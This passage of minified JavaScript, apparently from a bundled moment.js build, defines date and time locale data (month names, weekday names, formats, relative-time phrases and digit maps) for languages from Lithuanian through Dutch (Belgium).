            return e < 12 ? "ຕອນເຊົ້າ" : "ຕອນແລງ"
        },
        calendar: {
            sameDay: "[ມື້ນີ້ເວລາ] LT",
            nextDay: "[ມື້ອື່ນເວລາ] LT",
            nextWeek: "[ວັນ]dddd[ໜ້າເວລາ] LT",
            lastDay: "[ມື້ວານນີ້ເວລາ] LT",
            lastWeek: "[ວັນ]dddd[ແລ້ວນີ້ເວລາ] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "ອີກ %s",
            past: "%sຜ່ານມາ",
            s: "ບໍ່ເທົ່າໃດວິນາທີ",
            m: "1 ນາທີ",
            mm: "%d ນາທີ",
            h: "1 ຊົ່ວໂມງ",
            hh: "%d ຊົ່ວໂມງ",
            d: "1 ມື້",
            dd: "%d ມື້",
            M: "1 ເດືອນ",
            MM: "%d ເດືອນ",
            y: "1 ປີ",
            yy: "%d ປີ"
        },
        ordinalParse: /(ທີ່)\d{1,2}/,
        ordinal: function(e) {
            return "ທີ່" + e
        }
    });
    var ea = {
        m: "minutė_minutės_minutę",
        mm: "minutės_minučių_minutes",
        h: "valanda_valandos_valandą",
        hh: "valandos_valandų_valandas",
        d: "diena_dienos_dieną",
        dd: "dienos_dienų_dienas",
        M: "mėnuo_mėnesio_mėnesį",
        MM: "mėnesiai_mėnesių_mėnesius",
        y: "metai_metų_metus",
        yy: "metai_metų_metus"
    };
    _.defineLocale("lt", {
        months: {
            format: "sausio_vasario_kovo_balandžio_gegužės_birželio_liepos_rugpjūčio_rugsėjo_spalio_lapkričio_gruodžio".split("_"),
            standalone: "sausis_vasaris_kovas_balandis_gegužė_birželis_liepa_rugpjūtis_rugsėjis_spalis_lapkritis_gruodis".split("_"),
            isFormat: /D[oD]?(\[[^\[\]]*\]|\s)+MMMM?|MMMM?(\[[^\[\]]*\]|\s)+D[oD]?/
        },
        monthsShort: "sau_vas_kov_bal_geg_bir_lie_rgp_rgs_spa_lap_grd".split("_"),
        weekdays: {
            format: "sekmadienį_pirmadienį_antradienį_trečiadienį_ketvirtadienį_penktadienį_šeštadienį".split("_"),
            standalone: "sekmadienis_pirmadienis_antradienis_trečiadienis_ketvirtadienis_penktadienis_šeštadienis".split("_"),
            isFormat: /dddd HH:mm/
        },
        weekdaysShort: "Sek_Pir_Ant_Tre_Ket_Pen_Šeš".split("_"),
        weekdaysMin: "S_P_A_T_K_Pn_Š".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "YYYY-MM-DD",
            LL: "YYYY [m.] MMMM D [d.]",
            LLL: "YYYY [m.] MMMM D [d.], HH:mm [val.]",
            LLLL: "YYYY [m.] MMMM D [d.], dddd, HH:mm [val.]",
            l: "YYYY-MM-DD",
            ll: "YYYY [m.] MMMM D [d.]",
            lll: "YYYY [m.] MMMM D [d.], HH:mm [val.]",
            llll: "YYYY [m.] MMMM D [d.], ddd, HH:mm [val.]"
        },
        calendar: {
            sameDay: "[Šiandien] LT",
            nextDay: "[Rytoj] LT",
            nextWeek: "dddd LT",
            lastDay: "[Vakar] LT",
            lastWeek: "[Praėjusį] dddd LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "po %s",
            past: "prieš %s",
            s: function(e, t, n, i) {
                return t ? "kelios sekundės" : i ? "kelių sekundžių" : "kelias sekundes"
            },
            m: ot,
            mm: ut,
            h: ot,
            hh: ut,
            d: ot,
            dd: ut,
            M: ot,
            MM: ut,
            y: ot,
            yy: ut
        },
        ordinalParse: /\d{1,2}-oji/,
        ordinal: function(e) {
            return e + "-oji"
        },
        week: {
            dow: 1,
            doy: 4
        }
    });
    var ta = {
        m: "minūtes_minūtēm_minūte_minūtes".split("_"),
        mm: "minūtes_minūtēm_minūte_minūtes".split("_"),
        h: "stundas_stundām_stunda_stundas".split("_"),
        hh: "stundas_stundām_stunda_stundas".split("_"),
        d: "dienas_dienām_diena_dienas".split("_"),
        dd: "dienas_dienām_diena_dienas".split("_"),
        M: "mēneša_mēnešiem_mēnesis_mēneši".split("_"),
        MM: "mēneša_mēnešiem_mēnesis_mēneši".split("_"),
        y: "gada_gadiem_gads_gadi".split("_"),
        yy: "gada_gadiem_gads_gadi".split("_")
    };
    _.defineLocale("lv", {
        months: "janvāris_februāris_marts_aprīlis_maijs_jūnijs_jūlijs_augusts_septembris_oktobris_novembris_decembris".split("_"),
        monthsShort: "jan_feb_mar_apr_mai_jūn_jūl_aug_sep_okt_nov_dec".split("_"),
        weekdays: "svētdiena_pirmdiena_otrdiena_trešdiena_ceturtdiena_piektdiena_sestdiena".split("_"),
        weekdaysShort: "Sv_P_O_T_C_Pk_S".split("_"),
        weekdaysMin: "Sv_P_O_T_C_Pk_S".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD.MM.YYYY.",
            LL: "YYYY. [gada] D. MMMM",
            LLL: "YYYY. [gada] D. MMMM, HH:mm",
            LLLL: "YYYY. [gada] D. MMMM, dddd, HH:mm"
        },
        calendar: {
            sameDay: "[Šodien pulksten] LT",
            nextDay: "[Rīt pulksten] LT",
            nextWeek: "dddd [pulksten] LT",
            lastDay: "[Vakar pulksten] LT",
            lastWeek: "[Pagājušā] dddd [pulksten] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "pēc %s",
            past: "pirms %s",
            s: function(e, t) {
                return t ? "dažas sekundes" : "dažām sekundēm"
            },
            m: mt,
            mm: ht,
            h: mt,
            hh: ht,
            d: mt,
            dd: ht,
            M: mt,
            MM: ht,
            y: mt,
            yy: ht
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 4
        }
    });
    var na = {
        words: {
            m: ["jedan minut", "jednog minuta"],
            mm: ["minut", "minuta", "minuta"],
            h: ["jedan sat", "jednog sata"],
            hh: ["sat", "sata", "sati"],
            dd: ["dan", "dana", "dana"],
            MM: ["mjesec", "mjeseca", "mjeseci"],
            yy: ["godina", "godine", "godina"]
        },
        correctGrammaticalCase: function(e, t) {
            return 1 === e ? t[0] : 2 <= e && e <= 4 ? t[1] : t[2]
        },
        translate: function(e, t, n) {
            var i = na.words[n];
            return 1 === n.length ? t ? i[0] : i[1] : e + " " + na.correctGrammaticalCase(e, i)
        }
    };
    _.defineLocale("me", {
        months: "januar_februar_mart_april_maj_jun_jul_avgust_septembar_oktobar_novembar_decembar".split("_"),
        monthsShort: "jan._feb._mar._apr._maj_jun_jul_avg._sep._okt._nov._dec.".split("_"),
        monthsParseExact: !0,
        weekdays: "nedjelja_ponedjeljak_utorak_srijeda_četvrtak_petak_subota".split("_"),
        weekdaysShort: "ned._pon._uto._sri._čet._pet._sub.".split("_"),
        weekdaysMin: "ne_po_ut_sr_če_pe_su".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "H:mm",
            LTS: "H:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D. MMMM YYYY",
            LLL: "D. MMMM YYYY H:mm",
            LLLL: "dddd, D. MMMM YYYY H:mm"
        },
        calendar: {
            sameDay: "[danas u] LT",
            nextDay: "[sjutra u] LT",
            nextWeek: function() {
                switch (this.day()) {
                case 0:
                    return "[u] [nedjelju] [u] LT";
                case 3:
                    return "[u] [srijedu] [u] LT";
                case 6:
                    return "[u] [subotu] [u] LT";
                case 1:
                case 2:
                case 4:
                case 5:
                    return "[u] dddd [u] LT"
                }
            },
            lastDay: "[juče u] LT",
            lastWeek: function() {
                return ["[prošle] [nedjelje] [u] LT", "[prošlog] [ponedjeljka] [u] LT", "[prošlog] [utorka] [u] LT", "[prošle] [srijede] [u] LT", "[prošlog] [četvrtka] [u] LT", "[prošlog] [petka] [u] LT", "[prošle] [subote] [u] LT"][this.day()]
            },
            sameElse: "L"
        },
        relativeTime: {
            future: "za %s",
            past: "prije %s",
            s: "nekoliko sekundi",
            m: na.translate,
            mm: na.translate,
            h: na.translate,
            hh: na.translate,
            d: "dan",
            dd: na.translate,
            M: "mjesec",
            MM: na.translate,
            y: "godinu",
            yy: na.translate
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 7
        }
    }),
    _.defineLocale("mi", {
        months: "Kohi-tāte_Hui-tanguru_Poutū-te-rangi_Paenga-whāwhā_Haratua_Pipiri_Hōngoingoi_Here-turi-kōkā_Mahuru_Whiringa-ā-nuku_Whiringa-ā-rangi_Hakihea".split("_"),
        monthsShort: "Kohi_Hui_Pou_Pae_Hara_Pipi_Hōngoi_Here_Mahu_Whi-nu_Whi-ra_Haki".split("_"),
        monthsRegex: /(?:['a-z\u0101\u014D\u016B]+\-?){1,3}/i,
        monthsStrictRegex: /(?:['a-z\u0101\u014D\u016B]+\-?){1,3}/i,
        monthsShortRegex: /(?:['a-z\u0101\u014D\u016B]+\-?){1,3}/i,
        monthsShortStrictRegex: /(?:['a-z\u0101\u014D\u016B]+\-?){1,2}/i,
        weekdays: "Rātapu_Mane_Tūrei_Wenerei_Tāite_Paraire_Hātarei".split("_"),
        weekdaysShort: "Ta_Ma_Tū_We_Tāi_Pa_Hā".split("_"),
        weekdaysMin: "Ta_Ma_Tū_We_Tāi_Pa_Hā".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY [i] HH:mm",
            LLLL: "dddd, D MMMM YYYY [i] HH:mm"
        },
        calendar: {
            sameDay: "[i teie mahana, i] LT",
            nextDay: "[apopo i] LT",
            nextWeek: "dddd [i] LT",
            lastDay: "[inanahi i] LT",
            lastWeek: "dddd [whakamutunga i] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "i roto i %s",
            past: "%s i mua",
            s: "te hēkona ruarua",
            m: "he meneti",
            mm: "%d meneti",
            h: "te haora",
            hh: "%d haora",
            d: "he ra",
            dd: "%d ra",
            M: "he marama",
            MM: "%d marama",
            y: "he tau",
            yy: "%d tau"
        },
        ordinalParse: /\d{1,2}º/,
        ordinal: "%dº",
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("mk", {
        months: "јануари_февруари_март_април_мај_јуни_јули_август_септември_октомври_ноември_декември".split("_"),
        monthsShort: "јан_фев_мар_апр_мај_јун_јул_авг_сеп_окт_ное_дек".split("_"),
        weekdays: "недела_понеделник_вторник_среда_четврток_петок_сабота".split("_"),
        weekdaysShort: "нед_пон_вто_сре_чет_пет_саб".split("_"),
        weekdaysMin: "нe_пo_вт_ср_че_пе_сa".split("_"),
        longDateFormat: {
            LT: "H:mm",
            LTS: "H:mm:ss",
            L: "D.MM.YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY H:mm",
            LLLL: "dddd, D MMMM YYYY H:mm"
        },
        calendar: {
            sameDay: "[Денес во] LT",
            nextDay: "[Утре во] LT",
            nextWeek: "[Во] dddd [во] LT",
            lastDay: "[Вчера во] LT",
            lastWeek: function() {
                switch (this.day()) {
                case 0:
                case 3:
                case 6:
                    return "[Изминатата] dddd [во] LT";
                case 1:
                case 2:
                case 4:
                case 5:
                    return "[Изминатиот] dddd [во] LT"
                }
            },
            sameElse: "L"
        },
        relativeTime: {
            future: "после %s",
            past: "пред %s",
            s: "неколку секунди",
            m: "минута",
            mm: "%d минути",
            h: "час",
            hh: "%d часа",
            d: "ден",
            dd: "%d дена",
            M: "месец",
            MM: "%d месеци",
            y: "година",
            yy: "%d години"
        },
        ordinalParse: /\d{1,2}-(ев|ен|ти|ви|ри|ми)/,
        ordinal: function(e) {
            var t = e % 10
              , n = e % 100;
            return 0 === e ? e + "-ев" : 0 == n ? e + "-ен" : 10 < n && n < 20 ? e + "-ти" : 1 == t ? e + "-ви" : 2 == t ? e + "-ри" : 7 == t || 8 == t ? e + "-ми" : e + "-ти"
        },
        week: {
            dow: 1,
            doy: 7
        }
    }),
    _.defineLocale("ml", {
        months: "ജനുവരി_ഫെബ്രുവരി_മാർച്ച്_ഏപ്രിൽ_മേയ്_ജൂൺ_ജൂലൈ_ഓഗസ്റ്റ്_സെപ്റ്റംബർ_ഒക്ടോബർ_നവംബർ_ഡിസംബർ".split("_"),
        monthsShort: "ജനു._ഫെബ്രു._മാർ._ഏപ്രി._മേയ്_ജൂൺ_ജൂലൈ._ഓഗ._സെപ്റ്റ._ഒക്ടോ._നവം._ഡിസം.".split("_"),
        monthsParseExact: !0,
        weekdays: "ഞായറാഴ്ച_തിങ്കളാഴ്ച_ചൊവ്വാഴ്ച_ബുധനാഴ്ച_വ്യാഴാഴ്ച_വെള്ളിയാഴ്ച_ശനിയാഴ്ച".split("_"),
        weekdaysShort: "ഞായർ_തിങ്കൾ_ചൊവ്വ_ബുധൻ_വ്യാഴം_വെള്ളി_ശനി".split("_"),
        weekdaysMin: "ഞാ_തി_ചൊ_ബു_വ്യാ_വെ_ശ".split("_"),
        longDateFormat: {
            LT: "A h:mm -നു",
            LTS: "A h:mm:ss -നു",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY, A h:mm -നു",
            LLLL: "dddd, D MMMM YYYY, A h:mm -നു"
        },
        calendar: {
            sameDay: "[ഇന്ന്] LT",
            nextDay: "[നാളെ] LT",
            nextWeek: "dddd, LT",
            lastDay: "[ഇന്നലെ] LT",
            lastWeek: "[കഴിഞ്ഞ] dddd, LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "%s കഴിഞ്ഞ്",
            past: "%s മുൻപ്",
            s: "അൽപ നിമിഷങ്ങൾ",
            m: "ഒരു മിനിറ്റ്",
            mm: "%d മിനിറ്റ്",
            h: "ഒരു മണിക്കൂർ",
            hh: "%d മണിക്കൂർ",
            d: "ഒരു ദിവസം",
            dd: "%d ദിവസം",
            M: "ഒരു മാസം",
            MM: "%d മാസം",
            y: "ഒരു വർഷം",
            yy: "%d വർഷം"
        },
        meridiemParse: /രാത്രി|രാവിലെ|ഉച്ച കഴിഞ്ഞ്|വൈകുന്നേരം|രാത്രി/i,
        meridiemHour: function(e, t) {
            return 12 === e && (e = 0),
            "രാത്രി" === t && 4 <= e || "ഉച്ച കഴിഞ്ഞ്" === t || "വൈകുന്നേരം" === t ? e + 12 : e
        },
        meridiem: function(e, t, n) {
            return e < 4 ? "രാത്രി" : e < 12 ? "രാവിലെ" : e < 17 ? "ഉച്ച കഴിഞ്ഞ്" : e < 20 ? "വൈകുന്നേരം" : "രാത്രി"
        }
    });
    var ia = {
        1: "१",
        2: "२",
        3: "३",
        4: "४",
        5: "५",
        6: "६",
        7: "७",
        8: "८",
        9: "९",
        0: "०"
    }
      , aa = {
        "१": "1",
        "२": "2",
        "३": "3",
        "४": "4",
        "५": "5",
        "६": "6",
        "७": "7",
        "८": "8",
        "९": "9",
        "०": "0"
    };
    _.defineLocale("mr", {
        months: "जानेवारी_फेब्रुवारी_मार्च_एप्रिल_मे_जून_जुलै_ऑगस्ट_सप्टेंबर_ऑक्टोबर_नोव्हेंबर_डिसेंबर".split("_"),
        monthsShort: "जाने._फेब्रु._मार्च._एप्रि._मे._जून._जुलै._ऑग._सप्टें._ऑक्टो._नोव्हें._डिसें.".split("_"),
        monthsParseExact: !0,
        weekdays: "रविवार_सोमवार_मंगळवार_बुधवार_गुरूवार_शुक्रवार_शनिवार".split("_"),
        weekdaysShort: "रवि_सोम_मंगळ_बुध_गुरू_शुक्र_शनि".split("_"),
        weekdaysMin: "र_सो_मं_बु_गु_शु_श".split("_"),
        longDateFormat: {
            LT: "A h:mm वाजता",
            LTS: "A h:mm:ss वाजता",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY, A h:mm वाजता",
            LLLL: "dddd, D MMMM YYYY, A h:mm वाजता"
        },
        calendar: {
            sameDay: "[आज] LT",
            nextDay: "[उद्या] LT",
            nextWeek: "dddd, LT",
            lastDay: "[काल] LT",
            lastWeek: "[मागील] dddd, LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "%sमध्ये",
            past: "%sपूर्वी",
            s: ft,
            m: ft,
            mm: ft,
            h: ft,
            hh: ft,
            d: ft,
            dd: ft,
            M: ft,
            MM: ft,
            y: ft,
            yy: ft
        },
        preparse: function(e) {
            return e.replace(/[१२३४५६७८९०]/g, function(e) {
                return aa[e]
            })
        },
        postformat: function(e) {
            return e.replace(/\d/g, function(e) {
                return ia[e]
            })
        },
        meridiemParse: /रात्री|सकाळी|दुपारी|सायंकाळी/,
        meridiemHour: function(e, t) {
            return 12 === e && (e = 0),
            "रात्री" === t ? e < 4 ? e : e + 12 : "सकाळी" === t ? e : "दुपारी" === t ? 10 <= e ? e : e + 12 : "सायंकाळी" === t ? e + 12 : void 0
        },
        meridiem: function(e, t, n) {
            return e < 4 ? "रात्री" : e < 10 ? "सकाळी" : e < 17 ? "दुपारी" : e < 20 ? "सायंकाळी" : "रात्री"
        },
        week: {
            dow: 0,
            doy: 6
        }
    }),
    _.defineLocale("ms-my", {
        months: "Januari_Februari_Mac_April_Mei_Jun_Julai_Ogos_September_Oktober_November_Disember".split("_"),
        monthsShort: "Jan_Feb_Mac_Apr_Mei_Jun_Jul_Ogs_Sep_Okt_Nov_Dis".split("_"),
        weekdays: "Ahad_Isnin_Selasa_Rabu_Khamis_Jumaat_Sabtu".split("_"),
        weekdaysShort: "Ahd_Isn_Sel_Rab_Kha_Jum_Sab".split("_"),
        weekdaysMin: "Ah_Is_Sl_Rb_Km_Jm_Sb".split("_"),
        longDateFormat: {
            LT: "HH.mm",
            LTS: "HH.mm.ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY [pukul] HH.mm",
            LLLL: "dddd, D MMMM YYYY [pukul] HH.mm"
        },
        meridiemParse: /pagi|tengahari|petang|malam/,
        meridiemHour: function(e, t) {
            return 12 === e && (e = 0),
            "pagi" === t ? e : "tengahari" === t ? 11 <= e ? e : e + 12 : "petang" === t || "malam" === t ? e + 12 : void 0
        },
        meridiem: function(e, t, n) {
            return e < 11 ? "pagi" : e < 15 ? "tengahari" : e < 19 ? "petang" : "malam"
        },
        calendar: {
            sameDay: "[Hari ini pukul] LT",
            nextDay: "[Esok pukul] LT",
            nextWeek: "dddd [pukul] LT",
            lastDay: "[Kelmarin pukul] LT",
            lastWeek: "dddd [lepas pukul] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "dalam %s",
            past: "%s yang lepas",
            s: "beberapa saat",
            m: "seminit",
            mm: "%d minit",
            h: "sejam",
            hh: "%d jam",
            d: "sehari",
            dd: "%d hari",
            M: "sebulan",
            MM: "%d bulan",
            y: "setahun",
            yy: "%d tahun"
        },
        week: {
            dow: 1,
            doy: 7
        }
    }),
    _.defineLocale("ms", {
        months: "Januari_Februari_Mac_April_Mei_Jun_Julai_Ogos_September_Oktober_November_Disember".split("_"),
        monthsShort: "Jan_Feb_Mac_Apr_Mei_Jun_Jul_Ogs_Sep_Okt_Nov_Dis".split("_"),
        weekdays: "Ahad_Isnin_Selasa_Rabu_Khamis_Jumaat_Sabtu".split("_"),
        weekdaysShort: "Ahd_Isn_Sel_Rab_Kha_Jum_Sab".split("_"),
        weekdaysMin: "Ah_Is_Sl_Rb_Km_Jm_Sb".split("_"),
        longDateFormat: {
            LT: "HH.mm",
            LTS: "HH.mm.ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY [pukul] HH.mm",
            LLLL: "dddd, D MMMM YYYY [pukul] HH.mm"
        },
        meridiemParse: /pagi|tengahari|petang|malam/,
        meridiemHour: function(e, t) {
            return 12 === e && (e = 0),
            "pagi" === t ? e : "tengahari" === t ? 11 <= e ? e : e + 12 : "petang" === t || "malam" === t ? e + 12 : void 0
        },
        meridiem: function(e, t, n) {
            return e < 11 ? "pagi" : e < 15 ? "tengahari" : e < 19 ? "petang" : "malam"
        },
        calendar: {
            sameDay: "[Hari ini pukul] LT",
            nextDay: "[Esok pukul] LT",
            nextWeek: "dddd [pukul] LT",
            lastDay: "[Kelmarin pukul] LT",
            lastWeek: "dddd [lepas pukul] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "dalam %s",
            past: "%s yang lepas",
            s: "beberapa saat",
            m: "seminit",
            mm: "%d minit",
            h: "sejam",
            hh: "%d jam",
            d: "sehari",
            dd: "%d hari",
            M: "sebulan",
            MM: "%d bulan",
            y: "setahun",
            yy: "%d tahun"
        },
        week: {
            dow: 1,
            doy: 7
        }
    });
    var sa = {
        1: "၁",
        2: "၂",
        3: "၃",
        4: "၄",
        5: "၅",
        6: "၆",
        7: "၇",
        8: "၈",
        9: "၉",
        0: "၀"
    }
      , ra = {
        "၁": "1",
        "၂": "2",
        "၃": "3",
        "၄": "4",
        "၅": "5",
        "၆": "6",
        "၇": "7",
        "၈": "8",
        "၉": "9",
        "၀": "0"
    };
    _.defineLocale("my", {
        months: "ဇန်နဝါရီ_ဖေဖော်ဝါရီ_မတ်_ဧပြီ_မေ_ဇွန်_ဇူလိုင်_သြဂုတ်_စက်တင်ဘာ_အောက်တိုဘာ_နိုဝင်ဘာ_ဒီဇင်ဘာ".split("_"),
        monthsShort: "ဇန်_ဖေ_မတ်_ပြီ_မေ_ဇွန်_လိုင်_သြ_စက်_အောက်_နို_ဒီ".split("_"),
        weekdays: "တနင်္ဂနွေ_တနင်္လာ_အင်္ဂါ_ဗုဒ္ဓဟူး_ကြာသပတေး_သောကြာ_စနေ".split("_"),
        weekdaysShort: "နွေ_လာ_ဂါ_ဟူး_ကြာ_သော_နေ".split("_"),
        weekdaysMin: "နွေ_လာ_ဂါ_ဟူး_ကြာ_သော_နေ".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[ယနေ.] LT [မှာ]",
            nextDay: "[မနက်ဖြန်] LT [မှာ]",
            nextWeek: "dddd LT [မှာ]",
            lastDay: "[မနေ.က] LT [မှာ]",
            lastWeek: "[ပြီးခဲ့သော] dddd LT [မှာ]",
            sameElse: "L"
        },
        relativeTime: {
            future: "လာမည့် %s မှာ",
            past: "လွန်ခဲ့သော %s က",
            s: "စက္ကန်.အနည်းငယ်",
            m: "တစ်မိနစ်",
            mm: "%d မိနစ်",
            h: "တစ်နာရီ",
            hh: "%d နာရီ",
            d: "တစ်ရက်",
            dd: "%d ရက်",
            M: "တစ်လ",
            MM: "%d လ",
            y: "တစ်နှစ်",
            yy: "%d နှစ်"
        },
        preparse: function(e) {
            return e.replace(/[၁၂၃၄၅၆၇၈၉၀]/g, function(e) {
                return ra[e]
            })
        },
        postformat: function(e) {
            return e.replace(/\d/g, function(e) {
                return sa[e]
            })
        },
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("nb", {
        months: "januar_februar_mars_april_mai_juni_juli_august_september_oktober_november_desember".split("_"),
        monthsShort: "jan._feb._mars_april_mai_juni_juli_aug._sep._okt._nov._des.".split("_"),
        monthsParseExact: !0,
        weekdays: "søndag_mandag_tirsdag_onsdag_torsdag_fredag_lørdag".split("_"),
        weekdaysShort: "sø._ma._ti._on._to._fr._lø.".split("_"),
        weekdaysMin: "sø_ma_ti_on_to_fr_lø".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D. MMMM YYYY",
            LLL: "D. MMMM YYYY [kl.] HH:mm",
            LLLL: "dddd D. MMMM YYYY [kl.] HH:mm"
        },
        calendar: {
            sameDay: "[i dag kl.] LT",
            nextDay: "[i morgen kl.] LT",
            nextWeek: "dddd [kl.] LT",
            lastDay: "[i går kl.] LT",
            lastWeek: "[forrige] dddd [kl.] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "om %s",
            past: "%s siden",
            s: "noen sekunder",
            m: "ett minutt",
            mm: "%d minutter",
            h: "en time",
            hh: "%d timer",
            d: "en dag",
            dd: "%d dager",
            M: "en måned",
            MM: "%d måneder",
            y: "ett år",
            yy: "%d år"
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 4
        }
    });
    var oa = {
        1: "१",
        2: "२",
        3: "३",
        4: "४",
        5: "५",
        6: "६",
        7: "७",
        8: "८",
        9: "९",
        0: "०"
    }
      , la = {
        "१": "1",
        "२": "2",
        "३": "3",
        "४": "4",
        "५": "5",
        "६": "6",
        "७": "7",
        "८": "8",
        "९": "9",
        "०": "0"
    };
    _.defineLocale("ne", {
        months: "जनवरी_फेब्रुवरी_मार्च_अप्रिल_मई_जुन_जुलाई_अगष्ट_सेप्टेम्बर_अक्टोबर_नोभेम्बर_डिसेम्बर".split("_"),
        monthsShort: "जन._फेब्रु._मार्च_अप्रि._मई_जुन_जुलाई._अग._सेप्ट._अक्टो._नोभे._डिसे.".split("_"),
        monthsParseExact: !0,
        weekdays: "आइतबार_सोमबार_मङ्गलबार_बुधबार_बिहिबार_शुक्रबार_शनिबार".split("_"),
        weekdaysShort: "आइत._सोम._मङ्गल._बुध._बिहि._शुक्र._शनि.".split("_"),
        weekdaysMin: "आ._सो._मं._बु._बि._शु._श.".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "Aको h:mm बजे",
            LTS: "Aको h:mm:ss बजे",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY, Aको h:mm बजे",
            LLLL: "dddd, D MMMM YYYY, Aको h:mm बजे"
        },
        preparse: function(e) {
            return e.replace(/[१२३४५६७८९०]/g, function(e) {
                return la[e]
            })
        },
        postformat: function(e) {
            return e.replace(/\d/g, function(e) {
                return oa[e]
            })
        },
        meridiemParse: /राति|बिहान|दिउँसो|साँझ/,
        meridiemHour: function(e, t) {
            return 12 === e && (e = 0),
            "राति" === t ? e < 4 ? e : e + 12 : "बिहान" === t ? e : "दिउँसो" === t ? 10 <= e ? e : e + 12 : "साँझ" === t ? e + 12 : void 0
        },
        meridiem: function(e, t, n) {
            return e < 3 ? "राति" : e < 12 ? "बिहान" : e < 16 ? "दिउँसो" : e < 20 ? "साँझ" : "राति"
        },
        calendar: {
            sameDay: "[आज] LT",
            nextDay: "[भोलि] LT",
            nextWeek: "[आउँदो] dddd[,] LT",
            lastDay: "[हिजो] LT",
            lastWeek: "[गएको] dddd[,] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "%sमा",
            past: "%s अगाडि",
            s: "केही क्षण",
            m: "एक मिनेट",
            mm: "%d मिनेट",
            h: "एक घण्टा",
            hh: "%d घण्टा",
            d: "एक दिन",
            dd: "%d दिन",
            M: "एक महिना",
            MM: "%d महिना",
            y: "एक बर्ष",
            yy: "%d बर्ष"
        },
        week: {
            dow: 0,
            doy: 6
        }
    });
    var da = "jan._feb._mrt._apr._mei_jun._jul._aug._sep._okt._nov._dec.".split("_")
      , ua = "jan_feb_mrt_apr_mei_jun_jul_aug_sep_okt_nov_dec".split("_")
      , ca = [/^jan/i, /^feb/i, /^maart|mrt.?$/i, /^apr/i, /^mei$/i, /^jun[i.]?$/i, /^jul[i.]?$/i, /^aug/i, /^sep/i, /^okt/i, /^nov/i, /^dec/i]
      , ha = /^(januari|februari|maart|april|mei|april|ju[nl]i|augustus|september|oktober|november|december|jan\.?|feb\.?|mrt\.?|apr\.?|ju[nl]\.?|aug\.?|sep\.?|okt\.?|nov\.?|dec\.?)/i;
    _.defineLocale("nl-be", {
        months: "januari_februari_maart_april_mei_juni_juli_augustus_september_oktober_november_december".split("_"),
        monthsShort: function(e, t) {
            return /-MMM-/.test(t) ? ua[e.month()] : da[e.month()]
        },
        monthsRegex: ha,
        monthsShortRegex: ha,
        monthsStrictRegex: /^(januari|februari|maart|mei|ju[nl]i|april|augustus|september|oktober|november|december)/i,
        monthsShortStrictRegex: /^(jan\.?|feb\.?|mrt\.?|apr\.?|mei|ju[nl]\.?|aug\.?|sep\.?|okt\.?|nov\.?|dec\.?)/i,
        monthsParse: ca,
        longMonthsParse: ca,
        shortMonthsParse: ca,
        weekdays: "zondag_maandag_dinsdag_woensdag_donderdag_vrijdag_zaterdag".split("_"),
        weekdaysShort: "zo._ma._di._wo._do._vr._za.".split("_"),
        weekdaysMin: "Zo_Ma_Di_Wo_Do_Vr_Za".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[vandaag om] LT",
            nextDay: "[morgen om] LT",
            nextWeek: "dddd [om] LT",
            lastDay: "[gisteren om] LT",
            lastWeek: "[afgelopen] dddd [om] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "over %s",
            past: "%s geleden",
            s: "een paar seconden",
            m: "één minuut",
            mm: "%d minuten",
            h: "één uur",
            hh: "%d uur",
            d: "één dag",
            dd: "%d dagen",
            M: "één maand",
            MM: "%d maanden",
            y: "één jaar",
            yy: "%d jaar"
        },
        ordinalParse: /\d{1,2}(ste|de)/,
        ordinal: function(e) {
            return e + (1 === e || 8 === e || 20 <= e ? "ste" : "de")
        },
        week: {
            dow: 1,
            doy: 4
        }
    });
    var ma = "jan._feb._mrt._apr._mei_jun._jul._aug._sep._okt._nov._dec.".split("_")
      , fa = "jan_feb_mrt_apr_mei_jun_jul_aug_sep_okt_nov_dec".split("_")
